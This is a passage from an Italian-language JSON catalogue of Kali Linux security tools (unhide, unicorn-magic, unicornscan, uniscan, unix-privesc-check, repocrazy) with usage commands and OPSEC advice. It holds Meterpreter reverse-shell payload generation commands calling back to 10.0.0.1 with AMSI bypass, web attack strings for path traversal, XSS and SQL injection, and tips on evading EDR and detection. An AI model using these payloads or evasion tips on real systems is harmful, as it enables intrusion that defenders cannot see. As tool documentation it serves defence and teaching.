confronto.</p><p><strong>Mitigazioni:</strong> Eseguire lo strumento da un ambiente fidato quando possibile (live USB, chroot da sistema pulito). Combinare i risultati con altri strumenti di detection come rkhunter, chkrootkit e analisi della memoria con Volatility per una copertura completa. Eseguire multiple scansioni in tempi diversi per identificare processi intermittenti. Confrontare sempre i risultati con la baseline del sistema per distinguere falsi positivi da vere compromissioni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "unhide",
    "name": "unhide",
    "version": "20240510",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unhide/",
    "desc": "Rileva processi, porte TCP/UDP e filesystem nascosti da rootkit e malware.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Unhide</strong> e uno strumento forense scritto in C, progettato per rilevare processi, porte di rete TCP/UDP e file nascosti da rootkit e malware su sistemi Unix e Linux. Lo strumento rappresenta il progetto originale da cui e derivato unhide.rb, e offre prestazioni superiori grazie all'implementazione nativa in C che permette scansioni brute force dell'intero PID space in tempi molto ridotti. Unhide utilizza sei diverse tecniche di detection che sfruttano percorsi differenti per enumerare le risorse di sistema, confrontando i risultati per identificare inconsistenze causate da meccanismi di hiding. Il progetto include tre componenti principali: unhide per i processi, unhide-tcp per le porte di rete, e unhide-posix per verifiche a livello di filesystem POSIX. Lo strumento e incluso di default in molte distribuzioni Linux orientate alla sicurezza ed e considerato uno standard de facto per la detection di rootkit userland in contesti forensi e di incident response.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Sei Tecniche di Detection Processi:</strong> Unhide implementa le tecniche proc (confronto /proc vs kill), procall (enumerazione completa /proc), procfs (multiple verifiche su /proc), brute (brute force completo PID space), reverse (partenza da PID massimo), e sys (confronto syscall dirette). Ogni tecnica esplora un percorso diverso nel kernel per enumerare i processi, rendendo estremamente difficile per un rootkit eludere tutti i metodi. La combinazione di tutte le tecniche fornisce la massima copertura possibile a livello userland.</p><p><strong>Scansione Porte TCP/UDP Nascoste:</strong> Il componente unhide-tcp verifica la coerenza tra le porte riportate in /proc/net/tcp e /proc/net/udp e lo stato reale delle porte determinato tramite tentativi di binding. Per ogni porta nel range 1-65535, lo strumento verifica se e possibile effettuare un bind; se il bind fallisce con EADDRINUSE ma la porta non appare in /proc/net, una backdoor di rete potrebbe essere nascosta su quella porta.</p><p><strong>Verifica Filesystem POSIX:</strong> Il componente unhide-posix (o unhide-linux) effettua verifiche a livello di filesystem per identificare file e directory nascoste attraverso tecniche di comparazione tra readdir e accesso diretto tramite stat. Questa funzionalita rileva rootkit che nascondono file di configurazione, log o binari malevoli dal filesystem visibile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Unhide richiede privilegi di root per eseguire tutte le tecniche di detection. I sottomandi specificano quali tecniche applicare, e possono essere combinati per una scansione completa.</p><pre><code># Scansione con tutte le tecniche processi\nunhide -m -d sys procall brute\n\n# Quick scan (solo tecniche rapide)\nunhide quick\n\n# Solo tecnica proc (confronto /proc vs kill)\nunhide proc\n\n# Scansione porte TCP/UDP nascoste\nunhide-tcp\n\n# Verifica filesystem\nunhide-posix\n\n# Output dettagliato con logging\nunhide -m -d -f unhide_log.txt sys procall brute reverse</code></pre><p>Il flag -m abilita ulteriori controlli, -d attiva l'output verboso di debug, e -f redirige l'output su file. Per risultati affidabili, e consigliabile eseguire lo strumento da un supporto fidato o copiare il binario compilato staticamente sul sistema target per evitare dipendenze da librerie potenzialmente compromesse.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>risposta agli incidenti di sicurezza</strong>, unhide e uno dei primi strumenti eseguiti sulla macchina compromessa per determinare la presenza di rootkit e l'entita della compromissione. La scoperta di processi nascosti fornisce indicatori critici per guidare l'analisi forense successiva, identificando PID da analizzare con strumenti di memory forensics. Per il <strong>monitoraggio proattivo dell'integrita dei sistemi</strong>, unhide viene schedulato periodicamente via cron su server critici, con i risultati confrontati automaticamente con una baseline. Qualsiasi deviazione genera alert per il team di sicurezza. In contesti di <strong>hardening e compliance</strong>, l'esecuzione periodica di unhide dimostra due diligence nella protezione dei sistemi e soddisfa requisiti di controllo dell'integrita previsti da framework come NIST e ISO 27001.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La scansione brute force dell'intero PID space genera un pattern distintivo di system call (kill con signal 0) che rootkit kernel-level sofisticati possono intercettare. Rootkit come Diamorphine o Reptile possono rilevare l'esecuzione di unhide e alterare dinamicamente il loro comportamento per evitare la detection. L'attivita di unhide-tcp (tentativi di bind su tutte le porte) puo generare alert in sistemi di audit come auditd.</p><p><strong>Impatto operativo:</strong> La scansione brute force completa con tutte le tecniche puo richiedere diversi minuti e generare carico CPU misurabile. Su sistemi di produzione sotto carico, e consigliabile eseguire la scansione durante finestre di manutenzione. Falsi positivi sono possibili in sistemi con processi molto effimeri (container, microservizi) dove le condizioni di race tra enumerazione e terminazione sono frequenti.</p><p><strong>Mitigazioni:</strong> Per massimizzare l'affidabilita, eseguire unhide compilato staticamente da supporto esterno fidato. Combinare con analisi della memoria (Volatility, LiME) per rilevare rootkit kernel-level che eludono la detection userland. Automatizzare l'esecuzione periodica con confronto della baseline per rilevare cambiamenti nel tempo. Su sistemi critici, considerare l'uso di unhide in combinazione con framework di integrity monitoring come OSSEC o Samhain.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "unicorn-magic",
    "name": "unicorn-magic",
    "version": "3.12",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unicorn-magic/",
    "desc": "Genera payload PowerShell per injection diretta in memoria con bypass AMSI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Unicorn</strong> e uno strumento di generazione payload sviluppato da Dave Kennedy (TrustedSec), progettato per creare payload PowerShell che iniettano shellcode direttamente nella memoria del processo senza scrivere file su disco. Questo approccio fileless e fondamentale per evadere soluzioni antivirus e EDR che si basano sulla scansione di file, poiche il codice malevolo esiste esclusivamente in memoria. Unicorn include tecniche di bypass per AMSI (Antimalware Scan Interface), il meccanismo di sicurezza introdotto da Microsoft per scansionare contenuto PowerShell in runtime, e genera automaticamente payload offuscati che resistono all'analisi statica. Lo strumento supporta diversi formati di delivery tra cui script PowerShell puri, macro per documenti Office, file HTA (HTML Application), e certificati DDE, coprendo i principali vettori di initial access utilizzati nelle operazioni red team. La semplicita d'uso di Unicorn, combinata con la sua efficacia, lo ha reso uno degli strumenti piu popolari per la generazione di payload nelle fasi di social engineering e initial access.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Injection in Memoria via PowerShell:</strong> Unicorn genera script PowerShell che allocano memoria nel processo corrente tramite VirtualAlloc, copiano lo shellcode nell'area allocata, e trasferiscono l'esecuzione tramite CreateThread o delegate invocation. L'intero processo avviene senza creare file sul filesystem, eludendo scansioni AV basate su firma dei file. La tecnica sfrutta le capacita native di PowerShell per interagire con le API Windows tramite P/Invoke o reflection, rendendo il payload autocontenuto.</p><p><strong>Bypass AMSI e Offuscamento:</strong> Ogni payload generato include tecniche di bypass AMSI che disabilitano o eludono il meccanismo di scansione prima dell'esecuzione dello shellcode. Unicorn implementa diverse varianti di bypass, aggiornate regolarmente per contrastare le signature Microsoft, e applica offuscamento multi-livello al codice PowerShell per evitare la detection basata su pattern matching. L'offuscamento include encoding Base64, concatenazione di stringhe, e variable renaming.</p><p><strong>Formati di Delivery Multipli:</strong> Oltre agli script PowerShell standard, Unicorn genera payload in formati ottimizzati per diversi scenari di delivery. Le macro VBA per Office sono progettate per essere incollate direttamente in documenti Word o Excel, i file HTA sfruttano il motore MSHTA per l'esecuzione, e i payload DDE utilizzano Dynamic Data Exchange per eseguire comandi senza macro. Ogni formato implementa le tecniche di evasione appropriate per il vettore specifico.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Unicorn si utilizza da riga di comando specificando il tipo di payload Metasploit desiderato, l'indirizzo e la porta del listener, e opzionalmente il formato di delivery. Lo strumento genera i file necessari nella directory corrente.</p><pre><code># Payload PowerShell reverse HTTPS con Meterpreter\npython unicorn.py windows/meterpreter/reverse_https 10.0.0.1 443\n\n# Macro VBA per documento Office\npython unicorn.py windows/meterpreter/reverse_https 10.0.0.1 443 macro\n\n# File HTA per delivery via browser\npython unicorn.py windows/meterpreter/reverse_https 10.0.0.1 443 hta\n\n# Payload con Cobalt Strike beacon\npython unicorn.py cobalt_strike_beacon.bin cobalt_strike\n\n# Shellcode custom\npython unicorn.py custom_shellcode.bin custom\n\n# DDE attack per documenti Office senza macro\npython unicorn.py windows/meterpreter/reverse_https 10.0.0.1 443 dde</code></pre><p>Dopo la generazione, il file powershell_attack.txt contiene il comando PowerShell da eseguire sul target, mentre unicorn.rc contiene la configurazione del listener Metasploit. Per macro Office, il file viene generato con istruzioni su come incorporarlo nel documento.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nelle operazioni <strong>red team di initial access</strong>, Unicorn genera i payload per campagne di social engineering basate su documenti Office malevoli inviati via email. Le macro generate sono ottimizzate per apparire benigne durante l'analisi superficiale del documento. Per <strong>test di sicurezza sugli endpoint</strong>, i payload Unicorn vengono utilizzati per valutare l'efficacia delle soluzioni EDR e antivirus nel rilevare tecniche di memory injection e bypass AMSI, fornendo metriche concrete sulla postura difensiva dell'organizzazione. In scenari di <strong>assumed breach</strong> dove l'operatore ha gia accesso a una macchina, i payload Unicorn facilitano il lateral movement generando stager leggeri che possono essere eseguiti tramite WMI, PsExec o altre tecniche di esecuzione remota.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Nonostante le tecniche di offuscamento, i pattern di Unicorn sono ben noti ai vendor di sicurezza. Le signature AMSI vengono aggiornate frequentemente per rilevare le tecniche di bypass utilizzate. Soluzioni EDR moderne monitorano le API di memory allocation (VirtualAlloc) e creazione thread da contesti PowerShell, generando alert ad alta confidenza. L'esecuzione di PowerShell con argomenti encoded in Base64 e essa stessa un indicatore di compromissione monitorato.</p><p><strong>Impatto operativo:</strong> I payload generati hanno una finestra di efficacia limitata poiche i vendor aggiornano continuamente le signature. In ambienti con PowerShell Constrained Language Mode o WDAC (Windows Defender Application Control), i payload standard non funzionano. L'utilizzo di macro Office richiede che la vittima abiliti esplicitamente le macro, operazione che utenti con formazione security awareness rifiutano.</p><p><strong>Mitigazioni:</strong> Modificare manualmente i payload generati per diversificare le signature e aumentare la longevita. Testare i payload contro le specifiche soluzioni EDR del target prima del deployment in produzione. Utilizzare canali di comunicazione encrypted (HTTPS con certificate pinning) per il callback. Considerare alternative piu moderne come generatori di payload custom quando le tecniche standard di Unicorn vengono rilevate dall'ambiente target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "unicornscan",
    "name": "unicornscan",
    "version": "0.4.7",
    "icon": "../app/icons/unicornscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unicornscan/",
    "desc": "Port scanner asincrono userland per scansioni massive con rate elevati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Unicornscan</strong> e un port scanner asincrono che opera interamente in userland, progettato per scansioni di rete su larga scala ad altissima velocita. L'architettura di Unicornscan separa il processo di invio dei pacchetti (sender) da quello di ricezione delle risposte (receiver) in thread indipendenti, permettendo di raggiungere rate di scansione nell'ordine di centinaia di migliaia di pacchetti al secondo senza sacrificare l'accuratezza dei risultati. Questa separazione architetturale e fondamentale: mentre il sender genera pacchetti a rate costante senza attendere risposte, il receiver correla asincronamente le risposte in arrivo con i pacchetti inviati. Lo strumento supporta sia TCP che UDP, implementa tecniche di OS fingerprinting basate sull'analisi dello stack TCP/IP, e offre un sistema di moduli estensibile per personalizzare il comportamento di scansione. Unicornscan e particolarmente efficace quando si devono scansionare grandi range di indirizzi IP o tutte le 65535 porte su reti estese, scenari in cui scanner sincroni come nmap risultano significativamente piu lenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Architettura Asincrona Send/Receive:</strong> Il cuore di Unicornscan e la separazione tra il processo di invio e quello di ricezione. Il sender genera pacchetti SYN (o UDP) a rate configurabile senza attendere risposta, mentre il receiver opera in parallelo catturando e analizzando le risposte. Questa architettura elimina il collo di bottiglia del modello sincrono dove lo scanner attende il timeout per ogni porta chiusa, permettendo di completare scansioni di intere reti in una frazione del tempo richiesto da scanner tradizionali.</p><p><strong>Rate Control Granulare:</strong> Lo strumento offre controllo preciso sul rate di pacchetti al secondo (pps) tramite il flag -r. Questo permette di calibrare la scansione in base alla capacita della rete, della macchina sorgente, e del livello di stealth desiderato. Rate elevati (100k+ pps) sono adatti per reti locali ad alta velocita, mentre rate ridotti (100-1000 pps) sono appropriati per scansioni su Internet dove il rate limiting e la packet loss devono essere gestiti con attenzione.</p><p><strong>OS Fingerprinting Passivo:</strong> Durante la scansione, Unicornscan analizza le caratteristiche dei pacchetti di risposta (TTL, window size, opzioni TCP, flags) per determinare il sistema operativo del target. Questo fingerprinting passivo avviene come sottoprodotto della scansione porte senza generare traffico aggiuntivo, fornendo informazioni sull'OS simultaneamente alla discovery delle porte aperte.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Unicornscan utilizza una sintassi con flag per specificare il tipo di scansione, il rate, e il range di target e porte. Il suffisso :a indica tutte le porte (1-65535), mentre range specifici possono essere indicati con :1-1024.</p><pre><code># Scan TCP SYN su tutte le porte di una subnet\nunicornscan -mT -Iv 192.168.1.0/24:a\n\n# Con rate specifico di 10000 pps\nunicornscan -mT -r 10000 192.168.1.0/24:1-1024\n\n# Scan UDP di un singolo host\nunicornscan -mU 192.168.1.100:1-65535\n\n# Scan TCP con OS fingerprinting verboso\nunicornscan -mT -Iv -r 500 192.168.1.100:a\n\n# Output in formato one-line per parsing\nunicornscan -mT -r 5000 10.0.0.0/8:80,443,8080,8443\n\n# Scan UDP servizi comuni\nunicornscan -mU -r 1000 192.168.1.0/24:53,161,500,1900</code></pre><p>Il flag -m specifica la modalita (T per TCP, U per UDP), -I abilita informazioni immediate sulle risposte, e -v aumenta la verbosita. Per scansioni su Internet, e fondamentale calibrare il rate per evitare packet loss e risultati inaccurati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>scansioni su larga scala</strong> di reti enterprise con migliaia di host, Unicornscan completa in minuti operazioni che richiederebbero ore con scanner sincroni. Questo lo rende ideale nella fase iniziale di penetration test su reti estese dove e necessario costruire rapidamente un inventario dei servizi esposti. In contesti di <strong>asset discovery e shadow IT</strong>, la velocita di Unicornscan permette di scansionare periodicamente intere reti aziendali per identificare servizi non autorizzati o dispositivi sconosciuti. Per <strong>campagne di bug bounty</strong> con scope esteso, lo strumento facilita la discovery di servizi web su porte non standard scannerizzando l'intero range TCP di tutti gli IP in scope.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Scansioni ad alto rate generano un volume di traffico anomalo immediatamente visibile a qualsiasi sistema di monitoraggio di rete. IDS/IPS come Snort e Suricata hanno regole specifiche per rilevare pattern di port scanning, e il rate elevato di Unicornscan rende la detection triviale. Firewall stateful possono bloccare l'IP sorgente dopo aver rilevato un numero anomalo di connessioni SYN incomplete.</p><p><strong>Impatto operativo:</strong> Rate molto elevati possono saturare la banda di rete disponibile, causando degradazione dei servizi per gli utenti legittimi. Su reti con dispositivi fragili (stampanti, IoT, embedded systems), il volume di pacchetti puo causare crash o riavvii. I risultati di scansioni ad altissimo rate possono essere meno accurati a causa di packet loss, richiedendo scansioni di verifica sulle porte identificate.</p><p><strong>Mitigazioni:</strong> Calibrare il rate in base alla capacita della rete e concordare finestre di test con il cliente per le scansioni aggressive. Utilizzare rate ridotti per scansioni su Internet e riservare i rate elevati per segmenti di rete interni dedicati. Validare sempre i risultati con una scansione mirata di conferma usando nmap con service detection. Frammentare le scansioni in blocchi piu piccoli per ridurre il picco di traffico e facilitare la correlazione dei risultati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "uniscan",
    "name": "uniscan",
    "version": "6.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/uniscan/",
    "desc": "Scanner web per LFI, RFI, XSS, SQL injection con crawling automatico del sito.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Uniscan</strong> e uno scanner di vulnerabilita web che integra funzionalita di crawling automatico, directory bruteforce e testing di vulnerabilita comuni come Local File Inclusion (LFI), Remote File Inclusion (RFI), Cross-Site Scripting (XSS) e SQL Injection. Lo strumento opera in modo automatizzato, esplorando il sito target per scoprire pagine e parametri, e successivamente testando ogni punto di input con payload specifici per ciascuna classe di vulnerabilita. Uniscan e scritto in Perl e combina tecniche di analisi statica (estrazione di link, form e parametri dal codice HTML) con test dinamici (invio di payload e analisi delle risposte) per fornire una copertura completa. Sebbene non raggiunga la sofisticazione di scanner commerciali come Burp Suite Pro o Acunetix, Uniscan offre un approccio rapido e integrato utile come primo livello di assessment automatizzato durante penetration test web, particolarmente efficace per identificare vulnerabilita a bassa complessita in applicazioni senza protezioni WAF.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Crawling e Discovery Automatica:</strong> Uniscan implementa un crawler che segue i link nel sito target, estraendo URL, form, parametri e risorse referenziate. Il crawler analizza sia link HTML standard che riferimenti in JavaScript e CSS, costruendo una mappa del sito che viene poi utilizzata come base per il vulnerability testing. La funzionalita di directory bruteforce complementa il crawling testando path comuni non linkati esplicitamente nel sito.</p><p><strong>Testing Multi-Vulnerabilita:</strong> Lo strumento testa automaticamente ogni parametro scoperto per LFI (tentando di includere /etc/passwd e file di sistema), RFI (provando a includere risorse remote), XSS (iniettando tag script e event handler), e SQL injection (inserendo caratteri speciali e clausole SQL). Per ogni tipo di vulnerabilita, Uniscan analizza la risposta cercando indicatori di successo come contenuti di file inclusi, riflessi di script, o messaggi di errore database.</p><p><strong>Fingerprinting e Analisi Statica:</strong> Prima del testing attivo, Uniscan esegue fingerprinting delle tecnologie web utilizzate dal target, identificando web server, linguaggio di programmazione, framework e CMS. L'analisi statica include la ricerca di file sensibili comuni (robots.txt, .htaccess, backup files, directory listing) e la verifica di header HTTP per configurazioni di sicurezza mancanti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Uniscan si utilizza specificando l'URL target e i flag che determinano quali test eseguire. I flag possono essere combinati per una scansione completa.</p><pre><code># Scansione completa con tutti i test\nuniscan -u http://target.com/ -qweds\n\n# Solo directory bruteforce\nuniscan -u http://target.com/ -w\n\n# Test dinamici (LFI, RFI, XSS, SQLi)\nuniscan -u http://target.com/ -d\n\n# Analisi statica e fingerprinting\nuniscan -u http://target.com/ -e\n\n# Test dinamici avanzati con stress\nuniscan -u http://target.com/ -s\n\n# Crawling e discovery\nuniscan -u http://target.com/ -q</code></pre><p>I flag disponibili sono: -q (directory check), -w (file check), -e (robots/sitemap check), -d (dynamic testing), -s (stress testing). L'opzione -qweds combina tutti i test per una scansione esaustiva. E consigliabile iniziare con -e per fingerprinting e poi procedere con i test piu invasivi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Come strumento di <strong>primo livello in assessment web</strong>, Uniscan viene eseguito nella fase iniziale per identificare rapidamente le vulnerabilita piu evidenti e a bassa complessita. I risultati orientano il tester verso le aree dell'applicazione che meritano analisi manuale approfondita con strumenti piu sofisticati come Burp Suite. Per <strong>scansioni di massa su multiple applicazioni</strong>, Uniscan puo essere scriptato per eseguire test standardizzati su un portfolio di siti web, generando report per ciascuno che evidenziano le vulnerabilita piu critiche. In contesti <strong>educativi e di formazione</strong>, lo strumento illustra efficacemente come funzionano gli scanner automatizzati di vulnerabilita web, mostrando i payload utilizzati e le tecniche di detection per ciascuna classe di vulnerabilita.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Uniscan genera un volume significativo di richieste HTTP contenenti payload di attacco evidenti (../../../etc/passwd, <script>alert()</script>, ' OR 1=1--). Questi pattern sono immediatamente rilevabili da qualsiasi WAF o sistema di log analysis. Il crawling aggressivo e il directory bruteforce producono centinaia o migliaia di richieste in rapida successione, facilmente distinguibili dal traffico legittimo.</p><p><strong>Impatto operativo:</strong> Lo stress testing puo degradare le performance dell'applicazione target, potenzialmente causando denial of service su applicazioni con risorse limitate. I payload di SQL injection possono in rari casi causare effetti collaterali sul database (inserimento dati, modifica record) se l'applicazione non gestisce correttamente gli errori. Le richieste RFI tentano di contattare server esterni, generando traffico outbound anomalo.</p><p><strong>Mitigazioni:</strong> Eseguire le scansioni durante finestre di test concordate per evitare impatti sulla produzione. Utilizzare un proxy intercettante per filtrare payload potenzialmente distruttivi prima dell'invio. Monitorare le risposte del server per identificare tempestivamente eventuali effetti collaterali. Coordinare con il team operativo per distinguere il traffico di test dal traffico malevolo nei log di sicurezza.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "unix-privesc-check",
    "name": "unix-privesc-check",
    "version": "1.4",
    "icon": "../app/icons/unix-privesc-check-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unix-privesc-check/",
    "desc": "Script per trovare misconfiguration di privilege escalation su sistemi Unix/Linux.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Unix-privesc-check</strong> e uno script shell progettato per analizzare sistemi Unix e Linux alla ricerca di misconfiguration che potrebbero permettere privilege escalation da utente non privilegiato a root. Lo strumento esegue una serie completa di verifiche sulla configurazione del sistema, esaminando permessi di file e directory, binari SUID/SGID, regole sudo, cron job, capabilities del kernel, file di configurazione scrivibili, e numerose altre potenziali vie di escalation. A differenza di strumenti piu complessi come LinPEAS o Linux Smart Enumeration, unix-privesc-check e un singolo script shell POSIX-compatibile senza dipendenze esterne, il che lo rende estremamente portabile e eseguibile su qualsiasi sistema Unix senza necessita di installare interpeti o librerie aggiuntive. Lo strumento produce un output dettagliato che evidenzia ogni misconfiguration trovata con una spiegazione del rischio associato, facilitando sia l'exploitation durante penetration test che la remediation durante security audit.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Analisi Permessi File e Directory:</strong> Lo script esamina sistematicamente file di sistema critici (/etc/passwd, /etc/shadow, file di configurazione dei servizi) e directory sensibili verificando che i permessi siano configurati correttamente. Identifica file world-writable o group-writable che potrebbero essere modificati da utenti non privilegiati per ottenere accesso elevato. La verifica include anche la catena di directory padre, poiche permessi troppo aperti su una directory genitore possono permettere la sostituzione di file in sottodirectory piu restrittive.</p><p><strong>Verifica Binari SUID/SGID e Capabilities:</strong> Unix-privesc-check enumera tutti i binari con bit SUID o SGID impostato e li confronta con una lista di binari noti per essere sfruttabili per privilege escalation (come quelli documentati su GTFOBins). Analogamente, verifica le capabilities Linux assegnate ai binari, identificando capability pericolose come CAP_SETUID, CAP_DAC_OVERRIDE o CAP_SYS_ADMIN che possono essere abusate per ottenere privilegi root.</p><p><strong>Analisi Sudo e Cron:</strong> Lo strumento verifica la configurazione di sudoers per identificare regole troppo permissive che consentono l'esecuzione di comandi come root senza password o con wildcard sfruttabili. Per i cron job, controlla se gli script eseguiti periodicamente come root sono scrivibili dall'utente corrente o risiedono in directory non sicure, condizioni che permettono di iniettare comandi privilegiati attraverso la modifica dei cron script.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Unix-privesc-check supporta due modalita di scansione: standard (veloce, controlla le misconfiguration piu comuni) e detailed (approfondita, esamina ogni possibile vettore di escalation). Lo script non richiede root per l'esecuzione ma fornisce risultati piu completi se eseguito con l'utente target dell'escalation.</p><pre><code># Scansione standard (veloce)\nunix-privesc-check standard\n\n# Scansione dettagliata (completa)\nunix-privesc-check detailed\n\n# Salvare output per analisi offline\nunix-privesc-check detailed > /tmp/privesc_report.txt 2>&1\n\n# Filtrare solo i WARNING (finding critici)\nunix-privesc-check standard 2>&1 | grep WARNING\n\n# Esecuzione su sistema remoto via SSH\nssh user@target 'bash -s' < unix-privesc-check standard</code></pre><p>L'output classifica i risultati con etichette WARNING per misconfiguration sfruttabili e NOT VULNERABLE per controlli superati. E consigliabile eseguire prima la modalita standard per una panoramica rapida e poi detailed per un'analisi completa.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>post-exploitation</strong> durante un penetration test, unix-privesc-check viene trasferito ed eseguito sulle macchine compromesse per identificare rapidamente vie di privilege escalation verso root. I risultati guidano l'operatore nella selezione della tecnica di escalation piu affidabile e meno rumorosa tra quelle disponibili. Per <strong>security audit e compliance</strong>, lo strumento fornisce una verifica sistematica delle configurazioni di sicurezza del sistema operativo, generando un report che documenta ogni misconfiguration con il relativo rischio. I risultati possono essere utilizzati direttamente come finding nel report di audit. In contesti di <strong>hardening proattivo</strong>, i team di system administration eseguono lo script sui server prima del deployment in produzione per identificare e correggere misconfiguration prima che possano essere sfruttate da attaccanti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'esecuzione di unix-privesc-check genera un elevato numero di accessi al filesystem (stat, read su centinaia di file) e invocazioni di comandi di sistema (find, ls, cat) che possono essere registrati da sistemi di auditing come auditd o soluzioni EDR per Linux. Il pattern di accesso e caratteristico di strumenti di enumeration e puo attivare regole di detection specifiche. Lo script stesso puo essere rilevato da soluzioni di file integrity monitoring.</p><p><strong>Impatto operativo:</strong> La modalita detailed puo richiedere diversi minuti su filesystem di grandi dimensioni e generare carico I/O misurabile. L'output contiene informazioni sensibili sulla configurazione del sistema che devono essere protette durante il trasferimento e l'archiviazione. Su sistemi con auditing aggressivo, l'esecuzione dello script puo generare migliaia di entry nei log di audit.</p><p><strong>Mitigazioni:</strong> Rinominare lo script prima dell'esecuzione per evitare detection basata sul nome del file. Eseguire durante orari di minore monitoraggio o in concomitanza con attivita di manutenzione programmata. Eliminare lo script e l'output dal sistema target dopo l'analisi. Preferire la modalita standard quando il tempo e limitato e la stealth e prioritaria, riservando la modalita detailed per analisi offline su copie del filesystem.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "repocrazy",
    "name": "repocrazy",
    "version": "0.7.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/repocrazy/",
    "desc": "Cerca informazioni sensibili nei repository Debian e Ubuntu pubblicati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Repocrazy</strong> e uno strumento di security research progettato per analizzare repository di pacchetti Debian e Ubuntu alla ricerca di informazioni sensibili incluse accidentalmente nei pacchetti software distribuiti pubblicamente. Lo strumento scarica e decompone pacchetti .deb, esaminando il contenuto dei file installati, gli script di pre/post installazione, e i file di configurazione alla ricerca di credenziali hardcoded, chiavi API, token di autenticazione, endpoint interni, e altri secrets che gli sviluppatori potrebbero aver incluso inavvertitamente nel pacchetto. Questo tipo di analisi e particolarmente rilevante nel contesto della sicurezza della supply chain software, dove un singolo pacchetto compromesso o contenente credenziali valide puo esporre intere infrastrutture. Repocrazy supporta sia repository ufficiali Ubuntu e Debian sia repository di terze parti (PPA, repository aziendali), permettendo audit mirati sulla catena di distribuzione del software utilizzato dall'organizzazione target.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Download e Analisi Automatizzata dei Pacchetti:</strong> Repocrazy gestisce automaticamente il download dei pacchetti .deb dal repository specificato, la loro decompressione, e l'analisi sistematica del contenuto. Lo strumento esamina sia i file di dati (binari, librerie, configurazioni) che i file di controllo (preinst, postinst, prerm, postrm) che spesso contengono credenziali per database o servizi utilizzati durante l'installazione. L'automazione completa del processo permette di analizzare centinaia di pacchetti senza intervento manuale.</p><p><strong>Pattern di Detection Configurabili:</strong> Lo strumento utilizza un set di espressioni regolari per identificare secrets nei file analizzati. I pattern predefiniti coprono i formati piu comuni di credenziali (AWS access key, database connection string, token JWT, chiavi SSH private), ma possono essere estesi con pattern personalizzati per coprire formati specifici dell'organizzazione target. Questa flessibilita permette di adattare l'analisi al contesto specifico dell'engagement.</p><p><strong>Analisi Selettiva e Reporting:</strong> Repocrazy supporta il filtraggio per nome pacchetto, sezione, o priorita, permettendo di concentrare l'analisi su subset specifici del repository. I risultati vengono presentati con il contesto necessario per valutare la criticita del finding, incluso il nome del pacchetto, il file contenente il secret, e la riga specifica. L'output in formato JSON facilita l'integrazione con pipeline di analisi automatizzata e sistemi di ticketing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Repocrazy si utilizza specificando l'URL del repository Debian/Ubuntu da analizzare. Lo strumento gestisce automaticamente il parsing dell'indice dei pacchetti e il download selettivo.</p><pre><code># Analisi repository Ubuntu ufficiale\nrepocrazy --repo http://archive.ubuntu.com/ubuntu --dist focal --section main\n\n# Repository PPA di terze parti\nrepocrazy --repo http://ppa.launchpad.net/user/ppa/ubuntu\n\n# Analisi di un pacchetto specifico\nrepocrazy --repo http://repo.example.com/debian --package target-package\n\n# Output in formato JSON\nrepocrazy --repo http://repo.example.com --json -o results.json\n\n# Con pattern di 